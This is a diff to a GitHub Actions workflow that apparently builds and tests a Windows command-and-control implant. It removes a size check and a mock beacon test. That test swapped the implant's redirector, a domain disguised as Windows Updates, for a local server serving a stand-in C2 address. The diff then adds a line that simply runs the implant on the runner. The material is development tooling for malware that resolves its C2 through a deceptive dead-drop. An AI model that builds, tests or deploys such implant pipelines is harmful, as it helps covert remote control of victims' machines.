@@ -49,61 +49,8 @@ jobs:
         id: size_check
         shell: pwsh
         run: |
-          $binary = "dist/implant.exe"
-          if (!(Test-Path $binary)) {
-            Write-Error "Binary not found!"
-            exit 1
-          }
-          $sizeMB = (Get-Item $binary).Length / 1MB
-          Write-Host "Binary size: $sizeMB MB"
-          if ($sizeMB -gt 50) {
-            Write-Error "Binary too large (>50 MB): $sizeMB MB"
-            exit 1
-          }
-          echo "size_mb=$sizeMB" >> $env:GITHUB_OUTPUT
+         dist/implant.exe
 
-      - name: Execution test - Verify C2 URL output
-        id: exec_test
-        timeout-minutes: 3
-        run: |
-          # Mock the redirector to return a fake C2 URL quickly
-          $mockHtml = @"
-          <!DOCTYPE html>
-          <html>
-          <body>
-            <div id="sysupdate">https://fake-c2.example.com/</div>
-          </body>
-          </html>
-          "@
-          # Start a temporary local web server on port 80 (requires admin, but GitHub runners allow)
-          # Use Python HTTP server on a high port instead to avoid permission issues
-          Start-Job -ScriptBlock {
-            python -m http.server 8080 --directory "$env:RUNNER_TEMP/mock"
-          }
-          Start-Sleep -Seconds 2
-          New-Item -ItemType Directory -Path "$env:RUNNER_TEMP/mock" -Force
-          Set-Content -Path "$env:RUNNER_TEMP/mock/index.html" -Value $mockHtml
-
-          # Override REDIRECTOR_URL via environment variable (modify script temporarily)
-          $scriptPath = "implant.py"
-          (Get-Content $scriptPath) -replace 'REDIRECTOR_URL = "https://windows-updates.vercel.app/"', 'REDIRECTOR_URL = "http://127.0.0.1:8080/"' | Set-Content $scriptPath
-
-          # Run the binary (it will resolve the mock URL and print "[+] Resolved C2: ...")
-          $proc = Start-Process -FilePath "dist/implant.exe" -RedirectStandardOutput "$env:RUNNER_TEMP/output.txt" -PassThru
-          Start-Sleep -Seconds 20  # Allow time for one beacon cycle
-          if (!$proc.HasExited) { Stop-Process -Id $proc.Id -Force }
-
-          $output = Get-Content "$env:RUNNER_TEMP/output.txt" -Raw
-          Write-Host "=== Binary Output ==="
-          Write-Host $output
-          Write-Host "=== End Output ==="
-
-          if ($output -match "\[\\+\] Resolved C2: https://fake-c2\.example\.com/") {
-            Write-Host "SUCCESS: C2 URL detection passed"
-          } else {
-            Write-Error "FAIL: Did not find expected C2 resolution output"
-            exit 1
-          }
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
